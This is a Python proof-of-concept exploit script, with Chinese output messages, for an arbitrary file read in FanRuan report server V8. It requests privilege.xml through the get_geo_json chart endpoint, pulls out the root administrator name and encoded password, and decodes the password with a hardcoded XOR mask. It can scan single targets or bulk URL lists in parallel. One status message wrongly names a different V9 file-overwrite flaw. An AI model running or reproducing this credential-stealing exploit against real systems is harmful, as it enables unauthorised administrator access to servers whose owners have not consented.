import time
import argparse
import multiprocessing
import urllib3
from rich.console import Console
import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def decode_passwd(cipher):
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
    Password = ""
    cipher = cipher[3:]  # 截断三位后
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        Password = Password + chr(c2)
    return Password

def POC_1(target_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        vuln_url_1 = target_url + '/WebReport/ReportServer'
        vuln_url_2 = target_url + '/ReportServer'
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers)
        response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers)
        if "部署页面" in response_1.text:
            console.print(now_time() + ' [SUCCESS]  目标部署页面为:{}'.format(vuln_url_1), style='bold green')
            POC_2(vuln_url_1)
        elif "部署页面" in response_2.text:
            console.print(now_time() + ' [SUCCESS]  目标部署页面为:{}'.format(vuln_url_2), style='bold green')
            POC_2(vuln_url_2)
        else:
            console.print(now_time() + ' [WARNING]  帆软报表 V8  任意文件读取漏洞不存在', style='bold red ')

    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        sys.exit(0)

def POC_2(vuln_url_fileread):
    vuln_url = vuln_url_fileread + "?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        console.print(now_time() + " [INFO]     正在访问:{}".format(vuln_url), style='bold blue')
        if ("rootManagerPassword" in response.text) and (response.status_code) == 200:
            console.print(now_time() + ' [SUCCESS]  目标存在漏洞,读取敏感文件:{}'.format(response.text), style='bold green')
            user_name = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerName>', response.text)
            cipher = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerPassword>', response.text)
            password = decode_passwd(cipher[0])
            console.print(now_time() + ' [SUCCESS]  后台账户密码为:{} {}'.format(user_name[0], password), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  帆软报表 V8  任意文件读取漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    console.print(now_time() + " [INFO]     正在检测帆软报表 V9 design_save_svg 任意文件覆盖文件上传", style='bold blue')
    POC_1(target_url)
    

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')